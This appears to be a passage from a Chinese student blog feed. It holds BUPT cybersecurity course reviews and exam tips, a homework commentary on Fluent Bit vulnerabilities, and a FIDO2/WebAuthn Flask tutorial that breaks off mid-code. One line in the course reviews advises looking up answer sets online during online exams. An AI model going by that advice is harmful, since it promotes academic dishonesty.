<h3 id="编译原理与技术"><a href="#编译原理与技术" class="headerlink" title="编译原理与技术"></a>编译原理与技术</h3><p>老师是郭燕慧，23级应该是最后一年必修课了，24级开始好像改成和C++、JAVA、Python一起的四选一选修了，而且改到了大二下学期。如果学有余力的话可以选修，但是我建议还是别选了。</p>
<p>这门课是一门双语重量级课程。每节课扫码签到。<strong>期末50，作业实验30（5次assignment+5次lab），项目project20（2次）。</strong>实验和project都有学长学姐的资料参考，做起来不难。</p>
<p>期中有自愿小组汇报（当时信安是3人一组，网安是4人一组），汇报有额外3~5分加分，直接加到总分上，我们组加了4分。</p>
<p>期末题量很大，23级有16页，8道概念题+5道计算题（作业类型）+1道设计题+1道开放题。虽然是开卷，但是难度非常大，根本写不完。我当时是全部写上了，有些不会的基本是随便写给老师捞。我这门课正好90，应对考试得对课本特别熟悉，把每个概念标清楚。建议作业题在考试前盖上答案全部自己重新写一遍，然后构思一下设计题和开放题的考法，用GPT预设一下可能要考的内容。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1zGO7YDlHpn6ruFF39jfx6Q?pwd=gvef">编译原理</a></p>
<h3 id="网络空间安全治理"><a href="#网络空间安全治理" class="headerlink" title="网络空间安全治理"></a>网络空间安全治理</h3><p>可能这门课是我们班是邓小龙上的原因，我感觉这门课是大学最难受的一门课。因为邓小龙比较抽象。如果你们是803、804班，老师是王小娟，就不会有这种感觉，这课就等同于大三下专业选修课类型的水课。</p>
<p>24级开始改成大二下开课。<strong>这门课没有期末考试，只有期中考试且占比40分。剩下60分是大作业汇报+报告。</strong></p>
<p>大作业选题范围：钓鱼邮件、前沿APT攻击方式、社交舆情热点分析、社工学热点（基于LLM的社交机器人、社交网络群体智能博弈-话术）、人工智能数据投毒和软件投毒、经典病毒复现+配合学院的靶场上课 &#x3D; 有考试 + 动手实验 + 汇报。</p>
<p>期中考试（第12周左右）。这个不用准备，因为准备了也没用。我们当时说范围是课件1~3章，但是最后的题目和课件完全没有关系，所以建议不要浪费时间准备，准备和不准备考的都差不多。基本都会捞人，大概期中考试分数每个人都会在原始分上加10到20分。</p>
<p>大作业汇报（包括汇报表现40% + 大作业报告20%）：大作业一组不超过3人，邓小龙安排小组汇报时间较晚，每年都无法在结课前完成汇报，我们当时还剩十几组没有汇报完，一般安排在期末最后一门考试结束后的某天去网安楼会议室和他汇报。相比另一位老师王小娟，邓小龙要求非常高，如果不做出完整的系统平台和丰富的可视化界面，可能得分不是很高，并且邓小龙需要提交代码+PPT+演示视频。如果你们老师是王小娟的话可能汇报一下治理相关的调研就行了，只需提交PPT+文档，基本都能很高分。</p>
<p>一般组内的得分都不一样，每个人<strong>总评</strong>相差3~4分左右。汇报人和组长一般得分较高，但不是一定。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1ukBQATswLV4qbYybD4mC3A?pwd=3jki">治理</a></p>
<h3 id="算法设计与分析"><a href="#算法设计与分析" class="headerlink" title="算法设计与分析"></a>算法设计与分析</h3><p>王东滨上的，<strong>作业和期末考试各占50%。</strong>不签到，但是课上有雨课堂扫码做题。</p>
<p>作业占分挺大，四次作业，报告形式提交。</p>
<p>期末考试不难，题型和往年一样。每个章节都会涉及考题。</p>
<p>参考23级考题：前两题和历年题一样题型很简单，第三题考了线性的选择排序(p-r&lt;75那个，当时没写出来，那个代码在课件里面被挡住了)，第四题是动态规划最优子结构，第五题贪心算法分数背包，第六题回溯法N皇后。</p>
<p>考题全是课件和课本上的例题！例题！因此把课件上每一个算法原理能说出来，代码能默写出来，复杂度能说出来就基本可以拿90+。因此区分度都在作业，作业的报告尽量写的多一点，详细一点，不要只写代码和结果，把分析也写上去。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1xnd3e4XyxJVn0oMuWBc8og?pwd=qgwu">算法</a></p>
<h3 id="软件安全"><a href="#软件安全" class="headerlink" title="软件安全"></a>软件安全</h3><p>徐国胜老师上的，分数构成<strong>期末40平时30实验30</strong></p>
<p>每节课都会有扫码签到，并且每节课都要写课堂练习并上传到云平台。</p>
<p>开学第一节课会发共享文档组织同学自愿报名每节课的课堂演示实验，一般一节课一名同学，后期还有报名鸿蒙开发演讲。演讲的同学有平时分10分的加分，建议报名，老师会给参考的代码资料，保证平时分可以拿满。</p>
<p>会布置4个实验，还要考华为初级证书，做两个开源贡献(OpenKylin和OpenHarmony)，事情非常多，开源贡献审核非常慢，拖到了期末考试完。</p>
<p>期末考试大概有一半题目都是往年题原题。填空选择比较容易，大题有难度，大题都是给你一串代码问你漏洞，还有叫你设计漏洞程序写代码这种。最后一道12分题和某次实验很像。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1S5nHfRi5uYc76-ocrwZTDA?pwd=2rtw">软件安全</a></p>
<h3 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h3><p>老师是郑康锋。<strong>期末60平时40</strong>。期中有3人小组15页调研报告作业，期末闭卷。</p>
<p>有专门实验课，第六周开始的双周都在网安楼实验室上（共六个实验）。有些实验分成课上课下实验，课上部分需要下课前提交报告。</p>
<p>会不定时一个个点名签到，点了两次，算入平时分。</p>
<p>期末考试题目很多原题，背完基本能高分。</p>
<p>2023级期末考试题目：（考试时间2025.12.30）</p>
<p><strong>填空题10道</strong>（很简单，我的终极预测资料里全都有，背了就能全对）、<strong>选择题10道</strong>（也很基础，基本看了就会，有一道不属于PGP优点有点难度，全卷我就这个没复习到）、<strong>简答题7道</strong>（误用和异常入侵检测内容及其优缺点、TearDrop、ARP欺骗（要画图）、IPSec的两个过程（不用具体，第一阶段第二阶段里面的大致流程）、PGP加密认证（要画图）、snort实验三条规则（要会写：LAND、TCP NULL、SQL）。还有一道忘记了反正不难资料都有。<strong>开放题1道18分</strong>，多写一点，不会也要编。考了APT攻击（第一问叫你说1~2个APT案例、第二问是APT频繁出现原因、第三问是应对方法措施）</p>
<p>资料使用指南：</p>
<p>网络安全期末复习pdf，第一轮复习的版本，涵盖较全面，有时间可以慢慢看。</p>
<p>网络安全终极预测，第二轮整理版本，筛选了一部分内容，常考的内容。</p>
<p>网络安全真题回顾，全部真题，历年考过的。</p>
<p>网络安全：<a href="https://pan.baidu.com/s/1dmPH0BUYzPXlpsz84LvdNw?pwd=4qti">网络安全</a></p>
<h3 id="软件工程技术基础"><a href="#软件工程技术基础" class="headerlink" title="软件工程技术基础"></a>软件工程技术基础</h3><p>芦效峰上的，基本不签到可以不用听。</p>
<p><strong>期末考试开卷40</strong>，很简单，带书就行。我们当时20选择5道判断5道简答，全是书上的都能找到。最后2道画图题是平时作业布置的原题，准备好就行。</p>
<p><strong>期末大作业50</strong>（小米便签或者鸿蒙商城开发，3~4人一组，不交报告需要录个程序视频）。我们当时是4个人，做了非常多的功能，建议大家多加一点功能，这项就能拿满分。</p>
<p>我们小组做的鸿蒙商城开发。</p>
<p>Github：<a href="https://github.com/Harrisonls2004/WaterFlow">https://github.com/Harrisonls2004/WaterFlow</a></p>
<p>Gitee：<a href="https://gitee.com/Tooooa/WaterFlow">https://gitee.com/Tooooa/WaterFlow</a></p>
<p><strong>平时10</strong>（不签到但有次课写了一题课堂练习上交，课下有2次画图作业）</p>
<p>这门课不难，给分非常高，大家都是接近满分。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1JOSf-D79V_Es4Ml4kWS9-A?pwd=rmu8">软件工程</a></p>
<h3 id="大数据安全"><a href="#大数据安全" class="headerlink" title="大数据安全"></a>大数据安全</h3><p>石瑞生上的。<strong>考勤作业实验50分，期末开卷考试50分。</strong></p>
<p>实验和作业都是5人一组（五次作业五次实验，小组每人完成1次作业1次实验）。最后5节是实验汇报课，每节课汇报一个实验。建议去汇报，得分应该比不汇报的高。实验尽量做的扩展性创新性多一点，老师很喜欢，毕竟期末考试开卷不难，很多往年题原题，因此拉开差距的都是平时分。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1CF6PI24QaiE0NyOEubrGRA?pwd=w8w7">大数据安全</a></p>
<h3 id="Web开发技术基础"><a href="#Web开发技术基础" class="headerlink" title="Web开发技术基础"></a>Web开发技术基础</h3><p>我们当时是Web、可信还有第六学期两门课四选一。我第5学期只选了Web。</p>
<p>孙岩炜老师上的。<strong>平时分60期末开卷40</strong>。有次老师记录了上课坐前三排同学的名单，每人平时分加了5分。</p>
<p>两次调研论文作业，三次设计作业。</p>
<p>23级期末考试可以使用电脑打开PDF（所以比较难），22级及其之前只能用纸质材料。</p>
<p>虽然是开卷，但是期末有风险，选课请慎重！</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1EP-ySYqvavZS0Uv6sJv2QA?pwd=64xq">Web</a></p>
<h3 id="可信计算理论与技术"><a href="#可信计算理论与技术" class="headerlink" title="可信计算理论与技术"></a>可信计算理论与技术</h3><p>文献阅读作业30分，每人一份：选择课程相关的高水平论文进行评述。期末前提交，教师评分。</p>
<p>课程实验报告20分，每人一份：随堂实验的报告(运行过程与结果截图)。课后或期末前提交，教师评分。</p>
<p>小组课程项目50分，每组一份：分组完成一篇课程相关综述论文，并进行一次报告。论文期末提交(教师评分)，随堂报告(同学互评+教师评分)。评述对课程内容相关的高水平学术论文(可自选)。字数要求:1000字以上(Word五号字体1页)，中&#x2F;英文不限(不影响分数)。<br>基本内容要求：论文主要内容简介、论文的主要创新之处、论文对你的启发、论文的不足之处、论文可能的进一步工作等等。一定要有自己的见解，切忌只是单纯的翻译或转述论文。可以评述小组报告中的论文，但评述内容不能雷同!<br>AI工具:自己见解部分不能使用，其他部分使用必须明确标注(不能超过50%)</p>
<p>授课韩老师备课认真负责。本课程有助于建立对安全体系的整体认知；同时结合相关前沿动态传授科研经验。</p>
<p>以上是相关课程介绍，我没选，可能是早八原因吧。但是听说给分挺好的，做得好的还有奖品，学弟学妹如果不想选Web开卷考试的可以考虑一下这门课。</p>
<h3 id="计算理论"><a href="#计算理论" class="headerlink" title="计算理论"></a>计算理论</h3><p>我们培养方案是计算理论、安全法、安全通论三选一。我选了计算理论。听说24级开始网安只有安全法能选。计算理论和安全通论只有信安能选。</p>
<p>孙岩炜老师上的，是三选一中唯一一个不用pre的课程。</p>
<p>如果有这门课可以选，推荐选择，给分非常高。大家都是接近满分。</p>
<p>老师很好，上课也很认真，不签到，但是建议都去，去了还有期末论文加分。</p>
<p><strong>平时60期末论文40。</strong>平时两次作业，计入分数，github有答案，一定要写对，占分。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1E1Ew2SXjuJUGG-k4WG8ymA?pwd=ri2h">计算理论</a></p>
<h3 id="网络安全法"><a href="#网络安全法" class="headerlink" title="网络安全法"></a>网络安全法</h3><p>没有选择，当时这课排在早八起不来，而且据说给分参差不齐，有接近满分的也有85左右的。老师是谢永江。</p>
<p>考勤、课堂发言20。</p>
<p>课堂报告1次或读书报告2篇20。读书报告每篇2000到3000字。选择课堂报告此项直接满分。</p>
<p>期末考试60。提交课程论文(5000字以上)。要有AI说明。</p>
<h3 id="安全通论"><a href="#安全通论" class="headerlink" title="安全通论"></a>安全通论</h3><p>没有选择，这课当时也是早八，好像整个年级才选了18人。是王笑尘上的。</p>
<p>考勤20: 随机考勤</p>
<p>至少1次平时作业20: 自行调研相关文献，按内容要求撰写学习报告。</p>
<p>期末PPT汇报 + 提交大论文60: 给出几个论文题目，学生任选其一或自行拟定开展研究和论述，课程最后进行PPT汇报，并将PPT和大论文(一般包括背景描述、模型构建、结果分析、总结、参考文献五部分)。</p>
<h3 id="网络空间安全课程设计"><a href="#网络空间安全课程设计" class="headerlink" title="网络空间安全课程设计"></a>网络空间安全课程设计</h3><p>大三上的小学期。验收是崔宝江、苑洁老师一起考核，信安和网安一起合班。</p>
<p>崔老师要求比较高，验收答辩可能会有拷打。</p>
<p>题目有基础题（5人）、综合题（10人）、开放自选题（10人）。我们当时是8个人自选题，好好做就行，文档写多一点（当时有小组写了600页）。基本都是90+，因为难度较大，原则上不会给低于90分。</p>
<h2 id="大三下"><a href="#大三下" class="headerlink" title="大三下"></a>大三下</h2><p>2026年6月更新。</p>
<h2 id="英语课"><a href="#英语课" class="headerlink" title="英语课"></a>英语课</h2><p>23级是分了ABC班，不管哪个班大一大二4个学期每学期都有英语课。A班是综合4 + 公众英语 + 学术英语 + 八选一。B&#x2F;C班是综合2&#x2F;3 + 综合3&#x2F;4 + 英语听说2 + 九选一。24级开始好像只用上三个学期英语了，A班大一下就能选修英语课程。不过建议分班考试能考好点就好一点，尽量去A班，公众英语和学术英语这种英语选修课给分普遍比综合英语和进阶英语这种高，而且能提前考四级。</p>
<p>英语选课建议参考老师，不要参考课程。每年各个课程老师都不一样，这里推荐张爱阳老师。</p>
<h2 id="体育课"><a href="#体育课" class="headerlink" title="体育课"></a>体育课</h2><p>大一上是体育基础，考太极拳和3000米的。3000米比较折磨，我是刚刚达到毕业要求。所以这课我分数并不是很高。</p>
<p>356学期是自选课程，我选了排球、网球、匹克球。排球是李k上的，给分不算高。网球是崔ty上的，当时下雪了，考核只有正反手各打5个，只技术评分，好的90+，就算再差也是8889左右不会很低。</p>
<h2 id="公选课"><a href="#公选课" class="headerlink" title="公选课"></a>公选课</h2><p>公选课属于自行选修课程，最后不会算在取得保研资格排名中，但是对保外和出国有用，可以开包含公选课的成绩单用于外校夏令营和预推免。因此有保外或者出国打算的同学可以刷刷公选课提升教务系统上的排名。</p>
<h3 id="智慧树"><a href="#智慧树" class="headerlink" title="智慧树"></a>智慧树</h3><p>智慧树非常好，都是网课，基本都是97+，很好通过。期末是在线考试选择题，可以在网上查到成套的往年题，一边考试一边借鉴就可。</p>
<p>我大三之前每学期学校都会开差不多20门左右，可以随便选择。但是大三学年（2025秋季）开始学校出了新规，每学期只开3到4门，还需要抢名额，就比较难刷分了。</p>
<h3 id="亲密关系心理学"><a href="#亲密关系心理学" class="headerlink" title="亲密关系心理学"></a>亲密关系心理学</h3><p>非常火爆。但是我感觉也就那样。后面我也没去听课。期末交论文，给分95左右，能抢到可以抢，水水学分。</p>
<h3 id="跨文化沟通与商务礼仪"><a href="#跨文化沟通与商务礼仪" class="headerlink" title="跨文化沟通与商务礼仪"></a>跨文化沟通与商务礼仪</h3><p>大一上不太懂随便选的公选课。是郑春萍老师上的。事情有点多，会有签到，小组课堂汇报，期末录音作业。给分一般般。</p>
<h3 id="流行音乐赏析"><a href="#流行音乐赏析" class="headerlink" title="流行音乐赏析"></a>流行音乐赏析</h3><p>大一上选的，事不多，偶尔签到。是马辉老师，好像她是校歌作曲人。最后一节课课上会全班一起录一个合唱视频。最后交一篇论文或者自己录一段唱歌视频即可。</p>
<h3 id="显示技术的发展与游戏应用（双创）"><a href="#显示技术的发展与游戏应用（双创）" class="headerlink" title="显示技术的发展与游戏应用（双创）"></a>显示技术的发展与游戏应用（双创）</h3><p>一门关于显示技术的创新课，比较有意思，没有作业，没有考试，期末可以选择交论文，也可以选择相关话题最后一节课去汇报（汇报分会高一些）。用来水双创分还是可以的。</p>
<hr>
<h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><p>在最后，我想特别感谢以下几位学长，他们无私分享的资料为我提供了巨大的帮助：</p>
<p>XF（2022级）：<a href="https://github.com/77feng/bupt_scss_course">https://github.com/77feng/bupt_scss_course</a></p>
<p>SQ（2022级）：<a href="https://shenqi629.notion.site/">https://shenqi629.notion.site/</a></p>
<p>ZYH（2021级）：<a href="https://shuita2333.github.io/">https://shuita2333.github.io/</a></p>
<p>WD（2021级）：<a href="https://pewter-tarsier-5b9.notion.site/1d826533399b4e44a8a513ddd63e881a">https://pewter-tarsier-5b9.notion.site/1d826533399b4e44a8a513ddd63e881a</a></p>
<p>HDW（2021级）：<a href="https://github.com/fengchen555/BUPT-SCSS-learning-source">https://github.com/fengchen555/BUPT-SCSS-learning-source</a></p>
<p>正是依靠这些前辈们整理的内容，我得以顺利度过学习中的许多难关，在此由衷感谢各位大佬们的付出。</p>
<p>本文可以视作对往届资料的补充与更新，同时结合了我个人的学习笔记，希望能为大家提供更全面、更实用的参考，帮助大家在学习的道路上少走弯路。</p>
<p>此外，2024级的同学们也可以关注同级同学 RCY 的最新资料仓库哦～</p>
<p>RCY（2024级）：<a href="https://github.com/cyruan815/BUPT_SCSS_2024">https://github.com/cyruan815/BUPT_SCSS_2024</a></p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是北邮网安的主要课程介绍，希望对学弟学妹们有所帮助！</p>
<p>祝大家学业顺利！科研顺利！每天开心！🎓</p>
<p><em>本文内容基于个人经验整理，仅供参考。具体课程安排和考核方式以学校最新通知为准。</em></p>
]]></content>
      <categories>
        <category>课程总结</category>
      </categories>
      <tags>
        <tag>北邮</tag>
        <tag>网络空间安全</tag>
        <tag>信息安全</tag>
        <tag>课程介绍</tag>
      </tags>
  </entry>
  <entry>
    <title>云基础软件安全再度亮红灯</title>
    <url>/2025/11/28/%E4%BA%91%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%86%8D%E5%BA%A6%E4%BA%AE%E7%BA%A2%E7%81%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="软件安全资讯作业"><a href="#软件安全资讯作业" class="headerlink" title="软件安全资讯作业"></a>软件安全资讯作业</h2><h3 id="新闻链接"><a href="#新闻链接" class="headerlink" title="新闻链接"></a>新闻链接</h3><p><a href="https://www.theregister.com/2025/11/24/fluent_bit_cves">https://www.theregister.com/2025/11/24/fluent_bit_cves</a></p>
<h3 id="资讯描述"><a href="#资讯描述" class="headerlink" title="资讯描述"></a>资讯描述</h3><p>Fluent Bit在本周被披露存在多项高危漏洞，引发了云平台、DevOps团队与企业安全部门的广泛关注。作为开源日志采集和转发工具，Fluent Bit在许多企业的云原生架构、Kubernetes集群、监控系统甚至AI训练平台中扮演着关键角色。然而，此次披露的漏洞涉及认证绕过、路径遍历和可能的远程代码执行，使攻击者能够通过构造恶意日志数据获得异常权限，进而影响系统行为。</p>
<p>研究人员指出，这些漏洞中有相当一部分利用门槛极低，只需要向暴露的Fluent Bit端口发送特定请求就能触发。由于日志服务通常被视为基础组件，许多企业会以宽松权限部署Fluent Bit，使其能够访问大量系统文件和容器资源。这种“默认信任”导致漏洞风险被进一步放大，一旦攻击者入侵日志管道，可能不仅窃取系统日志，还能借助其权限对主机执行破坏性操作。<br>更令人担忧的是，日志工具通常与监控平台、容器运行时、云代理等其他组件高度耦合。一旦Fluent Bit被攻破，攻击者便可能利用日志流作为通道横向移动，影响同一台主机甚至整个集群的其他服务。在现代云原生系统中，这种“基础层组件被攻陷引发连锁反应”的情境并不少见，因此此次披露被视为一记重要警告。</p>
<h3 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h3><p>Fluent Bit的漏洞暴露了一个非常典型但长期被忽视的问题：基础设施组件与应用组件一样需要严格的安全治理。许多团队在关注业务系统安全时，往往忽略了像日志收集器、监控代理、网络插件这类“看不见的工具”，但它们恰恰是最接近系统底层、权限最高、访问最广的部分，一旦被攻破，比普通应用层漏洞更难定位，也更难阻断。</p>
<p>这一事件也提醒我们重新定义软件安全的边界。在真实的生产环境中，安全风险往往不是从显眼的地方开始，而是从那些被认为“不会出问题”的组件蔓延开来。Fluent Bit事件证明，攻击者正在越来越多地瞄准云原生基础工具，因为这些组件复杂度高、维护者有限、部署方式多样且通常缺乏系统性的安全审计，非常容易成为突破口。</p>
<p>从实践角度看，这类案例非常值得深入讨论。它说明现代软件安全不仅要防止“代码漏洞”和“配置错误”，还要把基础设施、运行环境和自动化工具纳入防护体系。企业应轮换版本、精简权限、强化隔离，并在日志管道与监控系统中加入行为监测机制，从根本上提高系统抵御基础层攻击的能力。日志组件的脆弱性不能再被忽略，否则下次的故障可能不是由应用引发，而是由最基础的工具造成。</p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>资讯作业</tag>
        <tag>软件安全</tag>
        <tag>北邮</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据安全作业3：FIFO协议</title>
    <url>/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="FIDO协议：为网站添加用户管理功能，支持FIDO2认证"><a href="#FIDO协议：为网站添加用户管理功能，支持FIDO2认证" class="headerlink" title="FIDO协议：为网站添加用户管理功能，支持FIDO2认证"></a>FIDO协议：为网站添加用户管理功能，支持FIDO2认证</h2><h3 id="FIDO协议基础"><a href="#FIDO协议基础" class="headerlink" title="FIDO协议基础"></a>FIDO协议基础</h3><p>FIDO（Fast IDentity Online，快速在线身份认证）协议是一种开放标准，旨在实现更加安全、便捷的无密码身份验证机制，减少传统口令认证带来的风险，如密码泄露、重放攻击及钓鱼攻击等问题。该标准由FIDO联盟（FIDO Alliance） 推动，目前主要包括三种规范：FIDO UAF、FIDO U2F与FIDO2。<strong>FIDO UAF（Universal Authentication Framework）</strong></p>
<p><strong>（1）FIDO UAF（通用认证框架）</strong></p>
<p>FIDO UAF支持用户通过设备上的本地生物识别技术（如指纹、人脸识别等）进行身份验证，而无需输入传统密码。在注册阶段，用户设备会创建一对密钥，并将私钥安全地保存于本地，仅将公钥提交到认证服务器。当用户再次登录时，设备利用私钥生成数字签名，服务器通过验证该签名来确认用户身份，从而实现无密码认证。</p>
<p><strong>（2）FIDO U2F（通用第二因素）</strong></p>
<p>FIDO U2F主要用于双因素认证（2FA）场景，通常与用户名及密码共同使用。在注册过程中，用户的安全密钥生成一对密钥，公钥存储于服务器端。当用户登录时，在输入密码后，系统会提示插入硬件密钥，密钥通过私钥对服务器提供的挑战值进行签名，从而完成身份验证。这种方式能够显著提升账号安全性。</p>
<p><strong>（3）FIDO2（FIDO2 &#x3D; WebAuthn+CTAP2）</strong></p>
<p>FIDO2是该系列标准的最新版本，由WebAuthn与CTAP2两部分组成，可同时支持无密码登录与双因素认证。</p>
<p>WebAuthn是由W3C与FIDO联盟联合制定的基于公钥加密的Web认证标准，使网站能够调用系统或外部认证设备（如指纹识别器、USB安全密钥）作为登录凭证。</p>
<p>CTAP2则定义了浏览器&#x2F;操作系统与认证器（例如指纹模块、YubiKey等硬件密钥）之间的通信方式。借助FIDO2，用户可在手机、电脑等多平台上使用安全设备进行登录，从而摆脱对传统密码的依赖。</p>
<h3 id="FIDO2工作流程"><a href="#FIDO2工作流程" class="headerlink" title="FIDO2工作流程"></a>FIDO2工作流程</h3><p>FIDO2的整个身份认证流程分为注册阶段和登录阶段两部分。以下是其详细机制说明。</p>
<p><strong>（1）注册阶段：</strong>当用户首次访问网站时，需要完成FIDO2凭证注册，过程如下。</p>
<p>a.用户发起注册请求：用户在网站注册界面（&#x2F;register）输入用户名和密码等基础信息，并请求启用FIDO2认证。前端通过表单提交用户名和密码到后端。</p>
<p>b.服务器生成挑战值：网站服务器接收注册请求后，首先验证用户名是否已存在。若不存在，使用generate_password_hash()对密码进行加密存储。然后在&#x2F;fido_register路由中，调用server.register_begin(user_entity)创建一个随机的挑战（challenge），确保认证过程的唯一性与安全性。服务器将挑战值和用户信息（用户ID、用户名、显示名称）、RP信息（应用名称和ID）、支持的公钥算法等打包成注册选项，并将其存储到会话中。</p>
<p>c.调用WebAuthn API：前端页面接收服务器返回的注册选项后，将Base64编码的challenge和user.id转换为ArrayBuffer格式，然后调用navigator.credentials.create()方法，并将服务器生成的挑战传递给浏览器。</p>
<p>d.生成密钥对：用户的认证设备（如指纹传感器、手机、硬件密钥等）接收该请求，并提示用户进行身份验证（如指纹或PIN码）。验证通过后，设备会生成独立的公私钥对。私钥：保存在本地设备，绝不会上传。公钥：将返回服务器用于后续验证。设备生成的凭证包含rawId（凭证ID）、response.clientDataJSON（客户端数据）和response.attestationObject（证明对象）。</p>
<p>e.服务器存储凭证：设备把公钥及相关元信息（如凭证ID、算法类型等）传回服务器。前端将凭证数据（Base64编码）发送到&#x2F;fido_complete_register路由，服务器调用server.register_complete()验证凭证数据的有效性。验证成功后，服务器提取凭证ID和公钥，使用CBOR编码公钥，并将其与用户账户关联保存到users[username][“credentials”]中。</p>
<p><strong>（2）登录阶段：</strong>当用户下次访问该网站时，可以直接通过FIDO2设备登录，过程如下。</p>
<p>a.发起登录请求：用户在&#x2F;login页面输入用户名和密码，并请求使用FIDO2登录。前端通过表单提交用户名和密码到后端。</p>
<p>b.生成挑战信息：服务器接收登录请求后，首先使用check_password_hash()验证用户名和密码是否正确。验证成功后，将用户名存储到会话中。然后在 &#x2F;fido_auth路由中，服务器为该会话生成新的挑战，从用户账户中读取已保存的凭证ID，调用server.authenticate_begin([credential_descriptor])生成认证选项，并将与用户关联的公钥元数据（凭证ID、challenge、rpId等）发送到客户端。</p>
<p>c.调用WebAuthn API：前端调用navigator.credentials.get()方法，将Base64编码的challenge和allowCredentials中的凭证ID转换为ArrayBuffer格式，将挑战值传递给认证设备。</p>
<p>d.签名生成：认证设备提示用户再次进行身份验证（如指纹识别），验证通过后，使用私钥对挑战进行签名，并返回签名数据。设备返回的断言包含rawId（凭证ID）、response.clientDataJSON（客户端数据）、response.authenticatorData（认证器数据）和response.signature（签名）。</p>
<p>e.验证签名：前端将签名数据（Base64编码）发送到&#x2F;fido_login路由。服务器接收签名结果后，从会话中获取之前存储的认证状态，从用户账户中读取已保存的公钥，调用server.authenticate_complete()通过已保存的公钥进行验证，确认签名真实有效。若验证成功，即表明用户确实持有对应的私钥，登录被批准。服务器在会话中设置authenticated标志为True。</p>
<p>这一流程实现了真正的“无密码安全登录”，同时兼顾了跨平台兼容性和强身份保障，使FIDO2成为现代网络认证体系的核心标准之一。</p>
<h3 id="项目实现"><a href="#项目实现" class="headerlink" title="项目实现"></a>项目实现</h3><p>项目设计结构图如下：</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-1.png" alt="图1"></p>
<p><strong>1.首先配置环境，确保浏览器和设备支持FIDO2（WebAuthn）认证功能</strong></p>
<p>pip install -r requirements.txt</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-2.png" alt="图2"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-3.png" alt="图3"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-4.png" alt="图4"></p>
<p><strong>2.编写程序</strong></p>
<p><strong>（1）首先在app.py中导入实现FIDO2认证所需的所有模块</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, jsonify, session, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> generate_password_hash, check_password_hash</span><br><span class="line"><span class="keyword">from</span> fido2.server <span class="keyword">import</span> Fido2Server</span><br><span class="line"><span class="keyword">from</span> fido2.webauthn <span class="keyword">import</span> PublicKeyCredentialRpEntity, PublicKeyCredentialUserEntity, PublicKeyCredentialDescriptor</span><br><span class="line"><span class="keyword">from</span> fido2.utils <span class="keyword">import</span> websafe_encode, websafe_decode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br></pre></td></tr></table></figure>

<p><strong>模块说明</strong>：</p>
<p>Flask相关：用于构建We 应用和路由处理</p>
<p>werkzeug.security：用于密码加密和验证</p>
<p>fido2.server.Fido2Server：实现WebAuthn协议的FIDO2认证服务，用于生成和验证FIDO2注册和认证请求</p>
<p>fido2.webauthn：包含FIDO2凭证相关的数据结构</p>
<p>base64：用于编码&#x2F;解码FIDO2数据</p>
<p><strong>（2）初始化Flask应用和FIDO2服务器</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启用 WebAuthn JSON 映射</span></span><br><span class="line"><span class="keyword">import</span> fido2.features</span><br><span class="line">fido2.features.webauthn_json_mapping.enabled = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(\__name_\_)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 RP Entity（Relying Party），使用正确的 origin</span></span><br><span class="line">rp = PublicKeyCredentialRpEntity(<span class="built_in">id</span>=<span class="string">&quot;localhost&quot;</span>, name=<span class="string">&quot;Example App&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 origin 验证函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_origin</span>(<span class="params">origin</span>): <span class="comment"># 允许 localhost 的所有端口</span></span><br><span class="line">    <span class="keyword">return</span> origin <span class="keyword">in</span> \[<span class="string">&quot;http://localhost:5000&quot;</span>, <span class="string">&quot;https://localhost:5000&quot;</span>\]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 Fido2Server，指定 origin 验证函数</span></span><br><span class="line">server = Fido2Server(rp, attestation=<span class="string">&quot;none&quot;</span>, verify_origin=verify_origin)</span><br><span 